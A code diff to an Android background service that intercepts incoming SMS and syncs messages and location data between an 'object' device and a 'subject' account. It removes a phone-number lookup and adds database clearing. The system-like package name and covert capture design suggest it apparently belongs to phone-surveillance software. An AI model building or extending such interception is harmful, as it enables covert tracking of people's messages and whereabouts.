@@ -8,20 +8,16 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.service.app.db.data.GenericAccount;
-import android.service.app.db.sqllite.SqlLiteDatabase;
-import android.service.app.db.data.impl.Message;
 import android.service.app.db.data.GenericDevice;
 import android.service.app.db.data.impl.Device;
-import android.service.app.db.data.GenericSync;
-import android.service.app.db.data.impl.Sync;
-import android.service.app.db.data.impl.Account;
+import android.service.app.db.data.impl.Message;
+import android.service.app.db.sqllite.SqlLiteDatabase;
+import android.service.app.rest.ExportDataTask;
 import android.service.app.rest.ImportDataTask;
 import android.service.app.rest.SyncOutput;
-import android.service.app.rest.ExportDataTask;
 import android.service.app.utils.AndroidUtils;
 import android.service.app.utils.Log;
 import android.support.annotation.Nullable;
-import android.telephony.TelephonyManager;
 
 public class Service extends android.app.Service
 {
@@ -31,7 +27,7 @@ public class Service extends android.app.Service
     public AndroidApplication app;
     private RemoteService.Stub remoteServiceStub;
     private boolean serviceStatus;
-    private GenericDevice device = null;
+    private GenericDevice device = new Device();
 
     @Override
     public void onCreate()
@@ -39,7 +35,6 @@ public class Service extends android.app.Service
         app = (AndroidApplication) getApplication();
         app.service = this;
         app.serviceOnCreate = true;
-        serviceStatus = true;
 
         SmsObserver smsObserver = new SmsObserver(this, handler);
         IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);
@@ -48,8 +43,9 @@ public class Service extends android.app.Service
         if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
         {
             receiverManager.registerReceiver(smsObserver.inSms, smsFilter, getApplicationContext());
-            initDatabase(getApplicationContext());
         }
+
+        SqlLiteDatabase.clear(getApplicationContext());
 
         fillDeviceIfNeeeded();
     }
@@ -104,46 +100,6 @@ public class Service extends android.app.Service
         {
             receiverManager.unregisterReceiver(smsObserver.inSms, getApplicationContext());
         }
-
-        serviceStatus = false;
-    }
-
-    public static void initDatabase(final Context context)
-    {
-        if (Log.isInfoEnabled()) Log.info("initDatabase");
-        //SqlLiteDatabase.clear(context);
-
-        TelephonyManager tm = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
-        final String phoneNumber = tm.getLine1Number();
-
-        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(context){
-            @Override
-            public Object execute()
-            {
-                if (devices().getFirst().isEmpty())
-                {
-
-                    //todo: need to parse this parameters from settings
-                    int accountId = insert(new Account(phoneNumber + "_xmail@mail.server"));
-
-                    GenericDevice device = new Device(AndroidUtils.getDeviceName(), accountId);
-                    int deviceId = insert(device);
-
-                    GenericSync sync = new Sync(accountId, deviceId, Device.table_name);
-                    updateOrInsertSyncIfNeeded(sync);
-                    //todo: need to parse this parameters from settings
-
-                    GenericAccount account = accounts().getFirst();
-                    updateOrInsertSyncIfNeeded(messages().getSyncForUpdate(account));
-                    updateOrInsertSyncIfNeeded(coordinates().getSyncForUpdate(account));
-                }
-
-                if (Log.isInfoEnabled()) Log.info("actualMessages=" + messages().getActualBySync());
-                return null;
-            }
-        };
-
-        databaseWork.runInTransaction();
     }
 
     private static void runSync(final Context context)
@@ -152,11 +108,18 @@ public class Service extends android.app.Service
             @Override
             public Object execute()
             {
-                // sync for object functionality
-                new ExportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
+                GenericAccount account = accounts().getFirst();
 
-                // sync for subobject functionality
-                new ImportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
+                if (AndroidUtils.SUBJECT.equals(account.getDescription()))
+                {
+                    // sync for subobject functionality
+                    new ImportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
+                }
+                else
+                {
+                    // sync for object functionality
+                    new ExportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
+                }
 
                 return null;
             }
@@ -172,7 +135,7 @@ public class Service extends android.app.Service
         return remoteServiceStub;
     }
 
-    public void runSmsEvent(final String address, final String body, final boolean incoming, ContentResolver contentResolver)
+    public void runSmsEvent(final String address, final String body, final boolean incoming)
     {
         new Thread(new Runnable()
         {
